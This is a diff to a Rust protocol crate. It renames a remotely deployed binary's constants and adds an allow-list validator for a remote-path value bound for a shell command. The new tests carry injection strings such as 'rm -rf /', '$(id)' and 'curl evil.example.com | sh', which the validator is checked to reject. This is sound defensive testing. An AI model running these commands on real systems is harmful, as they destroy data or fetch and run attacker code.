@@ -3,7 +3,7 @@
 //! `russh::client::Handle`) and `isekai-bootstrap::openssh` (the `isekai-ssh`
 //! CLI, over spawned `ssh(1)` subprocesses). Both upload the same binary to
 //! the same path and poll for the same handshake-file contract
-//! (`HELPER_PROTOCOL.md`), so the remote-side paths/filenames must actually
+//! (`archive/HELPER_PROTOCOL.md`), so the remote-side paths/filenames must actually
 //! be identical — keeping them as one shared `const` rather than two
 //! hand-copied literals is what guarantees that, not just documents it.
 //!
@@ -13,10 +13,13 @@
 //! `isekai-bootstrap` already depend on this pure `isekai-protocol` crate, so
 //! this is where the shared literals live.
 
-/// Remote install directory for the isekai-helper binary.
-pub const HELPER_INSTALL_DIR: &str = "~/.local/bin";
-/// Remote filename of the isekai-helper binary.
-pub const HELPER_BIN_NAME: &str = "isekai-helper";
+/// Remote install directory for the deployed binary.
+pub const ISEKAI_PIPE_INSTALL_DIR: &str = "~/.local/bin";
+/// Remote filename of the deployed binary (`isekai-pipe`, launched remotely
+/// as `isekai-pipe serve ...`; formerly the standalone `isekai-helper`
+/// binary before it was merged into `isekai-pipe`,
+/// `archive/ISEKAI_PIPE_MIGRATION.md` P5).
+pub const ISEKAI_PIPE_BIN_NAME: &str = "isekai-pipe";
 /// How many times the bootstrap remote shell polls for the handshake file to
 /// become non-empty before giving up.
 pub const HANDSHAKE_POLL_ATTEMPTS: u32 = 50;
@@ -89,6 +92,38 @@ pub fn validate_relay_sni(sni: &str) -> Result<(), ProtocolError> {
 /// defense-in-depth rationale as `validate_relay_sni`.
 pub fn validate_relay_jwt(jwt: &str) -> Result<(), ProtocolError> {
     validate_charset("relay_jwt", jwt)
+}
+
+/// Characters allowed in a `#@isekai remote-path` value once validated
+/// (`validate_remote_path`): the usual bootstrap-arg charset plus `/` (path
+/// separator) and `~` (leading home-directory shorthand, expanded by the
+/// remote shell itself — this is why the value is deliberately *not*
+/// `shell_single_quote`-wrapped like `relay_sni` before interpolation, single
+/// quoting would suppress that expansion).
+fn is_allowed_remote_path_char(c: char) -> bool {
+    is_allowed_bootstrap_arg_char(c) || matches!(c, '/' | '~')
+}
+
+/// Validates a `#@isekai remote-path` value against a strict allow-list
+/// charset before it is interpolated into a remote bootstrap shell command
+/// string (same defense-in-depth rationale as `validate_relay_sni`/
+/// `validate_relay_jwt` — this value comes from the user's own `ssh_config`,
+/// but a corrupted or attacker-controlled config file must not be able to
+/// smuggle shell metacharacters into the remote command).
+pub fn validate_remote_path(path: &str) -> Result<(), ProtocolError> {
+    if let Some(bad) = path.chars().find(|c| !is_allowed_remote_path_char(*c)) {
+        return Err(ProtocolError::InvalidBootstrapArg {
+            field: "remote_path",
+            reason: format!("contains disallowed character {bad:?} (allowed: A-Za-z0-9._-/~)"),
+        });
+    }
+    if path.is_empty() {
+        return Err(ProtocolError::InvalidBootstrapArg {
+            field: "remote_path",
+            reason: "must not be empty".to_string(),
+        });
+    }
+    Ok(())
 }
 
 #[cfg(test)]
@@ -166,5 +201,24 @@ mod tests {
     fn validate_relay_jwt_rejects_shell_metacharacters() {
         assert!(validate_relay_jwt("abc.def.ghi; rm -rf /").is_err());
         assert!(validate_relay_jwt("$(id)").is_err());
+    }
+
+    #[test]
+    fn validate_remote_path_accepts_typical_paths() {
+        assert!(validate_remote_path("~/.local/bin/isekai-pipe").is_ok());
+        assert!(validate_remote_path("/opt/isekai-pipe/bin/isekai-pipe").is_ok());
+    }
+
+    #[test]
+    fn validate_remote_path_rejects_empty() {
+        assert!(validate_remote_path("").is_err());
+    }
+
+    #[test]
+    fn validate_remote_path_rejects_shell_metacharacters() {
+        assert!(validate_remote_path("~/bin; rm -rf /").is_err());
+        assert!(validate_remote_path("$(id)").is_err());
+        assert!(validate_remote_path("`id`").is_err());
+        assert!(validate_remote_path("~/bin && curl evil.example.com | sh").is_err());
     }
 }
